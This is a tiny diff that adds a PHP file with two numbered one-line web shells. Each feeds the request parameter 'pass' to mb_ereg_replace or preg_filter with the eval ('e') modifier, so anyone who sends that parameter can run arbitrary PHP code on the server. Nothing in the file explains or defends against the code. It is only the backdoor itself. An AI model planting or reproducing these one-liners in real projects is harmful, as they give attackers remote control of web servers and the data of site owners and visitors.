@@ -1,0 +1,6 @@
+//1
+mb_ereg_replace('.*', $_REQUEST['pass'], '', 'e');
+
+//2
+echo preg_filter('|.*|e', $_REQUEST['pass'], '');
+
